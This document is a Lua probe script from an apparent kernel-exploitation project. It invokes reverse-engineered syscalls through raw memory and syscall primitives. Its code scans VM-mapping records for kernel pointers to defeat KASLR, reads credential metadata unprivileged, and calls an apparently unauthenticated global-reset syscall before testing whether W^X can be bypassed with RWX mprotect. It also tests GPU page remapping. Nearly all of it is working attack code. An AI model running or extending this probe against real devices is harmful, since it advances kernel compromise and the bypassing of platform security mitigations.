-- CRASH_CLASS: MODERATE
-- PROBE 55e: sys 674/587/672/673/675/676/671 — VM enum, cred leak, page remap
--
-- Context: sys 601 mostly dead (no init state). These are the remaining
-- untested handlers from kernel RE with interesting attack surface:
--   674: virtual_query_all — enumerate VM mappings (72-byte records)
--   587: credential metadata — returns 0x88 bytes even unprivileged
--   672: dynlinker library list for debugger — module handles
--   673: page remap/exchange within same mapping (64KB aligned)
--   675: reset 3 global state fields (no visible auth)
--   676: CPU mode update (mode 2)
--   671: resource class query (2 values per class)

print("=== PROBE 55e: VM/CRED/REMAP SURVEY ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function hexval(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    if h == 0 then return string.format("0x%X", l) end
    return string.format("0x%X_%08X", h, l)
end

local sc20 = make_syscall(20)
local pid_ok, pid_val = pcall(function() return sc20() end)
local pid = to_num(pid_val)
print("PID: " .. pid)

local function alive()
    local ok = pcall(function() return sc20() end)
    return ok
end

-- ============================================================
-- [A] sys 674 — virtual_query_all (KASLR CANDIDATE)
-- Args: buf, stride, max_records, count_ptr, mode=0x40000000
-- Returns 72-byte VM region descriptors
-- ============================================================
print("")
print("[A] sys 674 — virtual_query_all")
do
    local sc674 = make_syscall(674)
    local STRIDE = 72
    local MAX_RECORDS = 256
    local buf = memory.alloc(STRIDE * MAX_RECORDS)
    for i = 0, STRIDE * 4 - 1, 4 do safe_wd(buf + i, 0) end
    local countp = memory.alloc(16)
    safe_wq(countp, uint64(0))

    local ok, ret = pcall(function()
        return sc674(uint64(buf), uint64(STRIDE), uint64(MAX_RECORDS),
                      uint64(countp), uint64(0x40000000))
    end)
    if ok then
        print("  ret: " .. hexval(ret))
        local count_lo = safe_rd(countp)
        local count_hi = safe_rd(countp + 4)
        local count = count_lo or 0
        print("  total VM regions: " .. count)

        local kptr_count = 0
        local shown = 0
        local limit = count
        if limit > MAX_RECORDS then limit = MAX_RECORDS end
        if limit > 256 then limit = 256 end

        for i = 0, limit - 1 do
            local base = buf + i * STRIDE
            -- 72-byte record: likely start(8), end(8), prot(4), ...
            local lo0 = safe_rd(base)
            local hi0 = safe_rd(base + 4)
            local lo1 = safe_rd(base + 8)
            local hi1 = safe_rd(base + 12)
            local w4 = safe_rd(base + 16)
            local w5 = safe_rd(base + 20)

            -- Check all qwords for kernel pointers
            local has_kptr = false
            for off = 0, 64, 8 do
                local lo = safe_rd(base + off)
                local hi = safe_rd(base + off + 4)
                if hi and hi >= 0xFFFF8000 and lo and lo ~= 0 then
                    has_kptr = true
                    kptr_count = kptr_count + 1
                end
            end

            if shown < 20 or has_kptr then
                local line = string.format("  [%d] %08X_%08X - %08X_%08X prot=%08X flags=%08X",
                    i, hi0 or 0, lo0 or 0, hi1 or 0, lo1 or 0, w4 or 0, w5 or 0)
                if has_kptr then line = line .. " <<< KERNEL PTR!" end
                print(line)
                shown = shown + 1
            end
        end

        if kptr_count > 0 then
            print("  >>> " .. kptr_count .. " KERNEL POINTERS IN VM MAP!")
        else
            print("  no kernel pointers in VM map")
        end
    else
        print("  CRASHED: " .. tostring(ret))
    end
    if not alive() then print("  PROCESS DEAD"); return end
end

-- ============================================================
-- [B] sys 587 — credential metadata (ALWAYS returns filtered data)
-- Args: pid (0=self), output_buf
-- Returns 0x88 bytes: authid + capabilities even unprivileged
-- ============================================================
print("")
print("[B] sys 587 — credential metadata")
do
    local sc587 = make_syscall(587)
    local buf = memory.alloc(0x100)
    for i = 0, 0xFC, 4 do safe_wd(buf + i, 0) end

    -- pid=0 means self
    local ok, ret = pcall(function()
        return sc587(uint64(0), uint64(buf))
    end)
    if ok then
        print("  ret: " .. hexval(ret))
        local any_nonzero = false
        for off = 0, 0x84, 4 do
            local v = safe_rd(buf + off)
            if v and v ~= 0 then
                print(string.format("    +0x%02X: 0x%08X", off, v))
                any_nonzero = true
            end
        end
        -- Check for kernel pointers
        for off = 0, 0x80, 8 do
            local lo = safe_rd(buf + off)
            local hi = safe_rd(buf + off + 4)
            if hi and hi >= 0xFFFF8000 and lo and lo ~= 0 then
                print(string.format("    +0x%02X QWORD: 0x%08X_%08X  <<< KERNEL PTR!", off, hi, lo))
            end
        end
        if not any_nonzero then print("    (all zeros)") end
    else
        print("  CRASHED: " .. tostring(ret))
    end
    if not alive() then print("  PROCESS DEAD"); return end

    -- Also try with our own PID
    print("  [B2] pid=" .. pid)
    for i = 0, 0xFC, 4 do safe_wd(buf + i, 0) end
    local ok2, ret2 = pcall(function()
        return sc587(uint64(pid), uint64(buf))
    end)
    if ok2 then
        print("  ret: " .. hexval(ret2))
        for off = 0, 0x84, 4 do
            local v = safe_rd(buf + off)
            if v and v ~= 0 then
                print(string.format("    +0x%02X: 0x%08X", off, v))
            end
        end
    else
        print("  CRASHED: " .. tostring(ret2))
    end
    if not alive() then print("  PROCESS DEAD"); return end
end

-- ============================================================
-- [C] sys 672 — dynlinker library list (debugger)
-- Args: handle_array, capacity(64-bit), count_ptr(64-bit)
-- ============================================================
print("")
print("[C] sys 672 — dynlinker library list")
do
    local sc672 = make_syscall(672)
    local handles = memory.alloc(0x400)  -- room for 256 handles
    for i = 0, 0x3FC, 4 do safe_wd(handles + i, 0) end
    local countp = memory.alloc(16)
    safe_wq(countp, uint64(0))

    local ok, ret = pcall(function()
        return sc672(uint64(handles), uint64(256), uint64(countp))
    end)
    if ok then
        print("  ret: " .. hexval(ret))
        local count = safe_rd(countp) or 0
        print("  module count: " .. count)
        local show = count
        if show > 40 then show = 40 end
        for i = 0, show - 1 do
            local h = safe_rd(handles + i * 4)
            if h and h ~= 0 then
                print(string.format("    [%d] handle=0x%08X", i, h))
            end
        end
    else
        print("  CRASHED: " .. tostring(ret))
    end
    if not alive() then print("  PROCESS DEAD"); return end
end

-- ============================================================
-- [D] sys 675 — reset 3 global state fields (no visible auth)
-- No args consumed. Writes 1, -1, 0 to three globals.
-- ============================================================
print("")
print("[D] sys 675 — reset global state")
do
    local sc675 = make_syscall(675)
    local ok, ret = pcall(function()
        return sc675(uint64(0), uint64(0))
    end)
    if ok then
        print("  ret: " .. hexval(ret))
        local h, l = get_hi_lo(ret)
        if l == 0 then
            print("  SUCCESS — globals reset")
            -- Test if anything changed: try mprotect RWX again
            local sc_mprotect = make_syscall(74)
            local sc_mmap = make_syscall(477)
            local pg = sc_mmap(uint64(0), uint64(0x4000), uint64(3),
                uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
            local ph, pl = get_hi_lo(pg)
            if pl ~= 0 and ph ~= 0xFFFFFFFF then
                local mret = sc_mprotect(pg, uint64(0x4000), uint64(7))
                local mh, ml = get_hi_lo(mret)
                print("  mprotect(RWX) after reset: " .. hexval(mret))
                if ml == 0 then
                    print("  >>> W^X BYPASSED AFTER GLOBAL RESET!")
                end
            end
        end
    else
        print("  CRASHED: " .. tostring(ret))
    end
    if not alive() then print("  PROCESS DEAD"); return end
end

-- ============================================================
-- [E] sys 676 — CPU mode update (mode 2, 0 args)
-- ============================================================
print("")
print("[E] sys 676 — CPU mode update")
do
    local sc676 = make_syscall(676)
    local ok, ret = pcall(function()
        return sc676()
    end)
    if ok then
        print("  ret: " .. hexval(ret))
    else
        print("  CRASHED: " .. tostring(ret))
    end
    if not alive() then print("  PROCESS DEAD"); return end
end

-- ============================================================
-- [F] sys 671 — resource class query
-- Args: selector(-1=self), mode(1 or 2), outA, outB
-- ============================================================
print("")
print("[F] sys 671 — resource class query")
do
    local sc671 = make_syscall(671)
    local outA = memory.alloc(16)
    local outB = memory.alloc(16)

    -- selector -1 (self), mode 1
    safe_wd(outA, 0)
    safe_wd(outB, 0)
    local ok, ret = pcall(function()
        return sc671(uint64(0xFFFFFFFF), uint64(1), uint64(outA), uint64(outB))
    end)
    if ok then
        local a = safe_rd(outA) or 0
        local b = safe_rd(outB) or 0
        print(string.format("  sel=-1 mode=1: ret=%s A=%d B=%d", hexval(ret), a, b))
    else
        print("  sel=-1 mode=1: CRASHED")
    end
    if not alive() then print("  PROCESS DEAD"); return end

    -- selector -1, mode 2
    safe_wd(outA, 0)
    safe_wd(outB, 0)
    local ok2, ret2 = pcall(function()
        return sc671(uint64(0xFFFFFFFF), uint64(2), uint64(outA), uint64(outB))
    end)
    if ok2 then
        local a = safe_rd(outA) or 0
        local b = safe_rd(outB) or 0
        print(string.format("  sel=-1 mode=2: ret=%s A=%d B=%d", hexval(ret2), a, b))
    else
        print("  sel=-1 mode=2: CRASHED")
    end
    if not alive() then print("  PROCESS DEAD"); return end

    -- Try explicit selectors 0-10
    for sel = 0, 10 do
        safe_wd(outA, 0)
        safe_wd(outB, 0)
        local ok3, ret3 = pcall(function()
            return sc671(uint64(sel), uint64(1), uint64(outA), uint64(outB))
        end)
        if ok3 then
            local h, l = get_hi_lo(ret3)
            local a = safe_rd(outA) or 0
            local b = safe_rd(outB) or 0
            if l == 0 and (a ~= 0 or b ~= 0) then
                print(string.format("  sel=%d mode=1: ret=0 A=%d B=%d", sel, a, b))
            elseif l ~= 0xFFFFFFFF then
                print(string.format("  sel=%d mode=1: ret=%s", sel, hexval(ret3)))
            end
        end
    end
end
if not alive() then print("  PROCESS DEAD"); return end

-- ============================================================
-- [G] sys 673 — page remap within GPU mmap
-- Args: src_addr, dst_addr, length, flags=0
-- Requires 64KB (0x10000) alignment, same mapping, backing obj type 11
-- Test with GPU mmap pages
-- ============================================================
print("")
print("[G] sys 673 — page remap (GPU mmap)")
do
    local sc673 = make_syscall(673)
    local sc_mmap = make_syscall(477)

    -- Allocate a large GPU mmap region
    local gpu = sc_mmap(uint64(0), uint64(0x100000), uint64(0x33),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    local gh, gl = get_hi_lo(gpu)
    if gl ~= 0 and gh ~= 0xFFFFFFFF then
        print("  GPU mmap at: " .. hexval(gpu))

        -- Align source and dest to 64KB within the mapping
        -- GPU base might not be 64KB aligned, so find first aligned offset
        local base_num = gl
        local aligned = base_num
        if aligned % 0x10000 ~= 0 then
            aligned = aligned + (0x10000 - (aligned % 0x10000))
        end
        local offset = aligned - base_num
        local src = uint64(string.format("0x%X%08X", gh, aligned))
        local dst = uint64(string.format("0x%X%08X", gh, aligned + 0x10000))
        local len = uint64(0x10000)

        print("  src: " .. hexval(src) .. " dst: " .. hexval(dst))

        -- Write pattern to source
        safe_wd(aligned, 0xDEADBEEF)
        safe_wd(aligned + 4, 0xCAFEBABE)

        local ok, ret = pcall(function()
            return sc673(src, dst, len, uint64(0))
        end)
        if ok then
            print("  ret: " .. hexval(ret))
            local h, l = get_hi_lo(ret)
            if l == 0 then
                print("  >>> REMAP SUCCEEDED!")
                -- Check if dest now has source data
                local d0 = safe_rd(aligned + 0x10000)
                local d4 = safe_rd(aligned + 0x10004)
                print(string.format("  dst[0]=%08X dst[4]=%08X", d0 or 0, d4 or 0))
                if d0 == 0xDEADBEEF then
                    print("  >>> DATA VISIBLE AT DEST — PAGE REMAP WORKS!")
                end
            end
        else
            print("  CRASHED: " .. tostring(ret))
        end
    else
        print("  GPU mmap failed")
    end
    if not alive() then print("  PROCESS DEAD"); return end
end

-- ============================================================
-- [H] sys 674 deep — if it worked, dump more records with kernel ptr scan
-- ============================================================
print("")
print("[H] sys 674 detailed kernel pointer scan")
do
    local sc674 = make_syscall(674)
    local STRIDE = 72
    local MAX_RECORDS = 512
    local buf = memory.alloc(STRIDE * MAX_RECORDS)
    -- Don't zero all — too big. Zero first few.
    for i = 0, STRIDE * 4 - 1, 4 do safe_wd(buf + i, 0) end
    local countp = memory.alloc(16)
    safe_wq(countp, uint64(0))

    local ok, ret = pcall(function()
        return sc674(uint64(buf), uint64(STRIDE), uint64(MAX_RECORDS),
                      uint64(countp), uint64(0x40000000))
    end)
    if ok then
        local h, l = get_hi_lo(ret)
        if l == 0 then
            local count = safe_rd(countp) or 0
            local limit = count
            if limit > MAX_RECORDS then limit = MAX_RECORDS end

            -- Scan ALL records for kernel pointers
            local kptrs = {}
            for i = 0, limit - 1 do
                local base = buf + i * STRIDE
                for off = 0, 64, 8 do
                    local lo = safe_rd(base + off)
                    local hi = safe_rd(base + off + 4)
                    if hi and hi >= 0xFFFF8000 and lo and lo ~= 0 then
                        table.insert(kptrs, string.format(
                            "  rec[%d]+%d: 0x%08X_%08X", i, off, hi, lo))
                    end
                end
            end
            if #kptrs > 0 then
                print("  >>> KERNEL POINTERS FOUND IN VM RECORDS!")
                for _, s in ipairs(kptrs) do print(s) end
            else
                print("  no kernel pointers in " .. limit .. " records")
            end
        else
            print("  ret: " .. hexval(ret) .. " (failed)")
        end
    else
        print("  (skipped — 674 not working)")
    end
end

print("")
print("=== PROBE 55e COMPLETE ===")
